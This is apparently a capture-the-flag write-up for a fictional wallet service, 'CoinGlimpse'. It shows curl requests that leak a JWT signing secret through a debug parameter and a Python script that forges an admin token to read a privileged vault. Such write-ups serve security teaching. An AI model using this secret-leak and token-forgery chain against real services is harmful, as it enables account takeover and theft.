# CoinGlimpse

## Challenge Description

CoinGlimpse is a small digital-wallet service. Visitors can register a wallet, sign in, and view their balance and vault on a personal dashboard panel. Each session is protected by a signed wallet token, and a privileged wallet somewhere in the service holds something valuable.

## Reconnaissance

The landing page offers a registration / login form. After authenticating, a personal dashboard appears showing:

- Balance
- Wallet ID
- Owner
- Currency
- Vault

There is also an “Import a wallet token” field and a **System diagnostics** panel (enabled by default).

Client-side JavaScript (`/app.js`) reveals the API surface:

- `POST /api/register`
- `POST /api/login`
- `GET  /api/wallet?debug=1`

Authentication is performed with a JWT sent in the `Authorization: Bearer <token>` header.

## Exploitation

### 1. Register a normal wallet

```bash
curl -s -X POST http://<TARGET>/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"testuser","pin":"1234"}'
```

Example response:

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "wallet": {
    "id": 3,
    "username": "testuser",
    "balance": 4015,
    "currency": "CGN",
    "vault": "classic savings vault"
  }
}
```

### 2. Leak the JWT signing secret

Request the wallet endpoint with the `debug=1` parameter:

```bash
TOKEN=<token-from-step-1>
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://<TARGET>/api/wallet?debug=1"
```

The response contains a `meta.debug` object that leaks critical information:

```json
"debug": {
  "signer": "HS256 (HMAC-SHA256)",
  "signerSecret": "c695c24fa40379f562e6ac360e3bb1b82d9b2a5a0da5fad3889d3dec6c31715c",
  "tokenTtlSec": 3600,
  "adminWallet": 1,
  "diagnosticsEnabled": true
}
```

Key takeaways:
- Algorithm: `HS256`
- Secret: `c695c24fa40379f562e6ac360e3bb1b82d9b2a5a0da5fad3889d3dec6c31715c`
- Admin wallet ID: `1`

### 3. Forge an admin token

Using the leaked secret we can craft a valid JWT for wallet ID 1:

```python
import jwt, time

secret = "c695c24fa40379f562e6ac360e3bb1b82d9b2a5a0da5fad3889d3dec6c31715c"
payload = {
    "wallet": 1,
    "role": "member",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

### 4. Access the privileged wallet

```bash
curl -s -H "Authorization: Bearer <forged-token>" \
  "http://<TARGET>/api/wallet?debug=1"
```

The vault of wallet ID 1 contains the flag.

## Flag

```
flag{[YOUR FLAG HERE]}
```
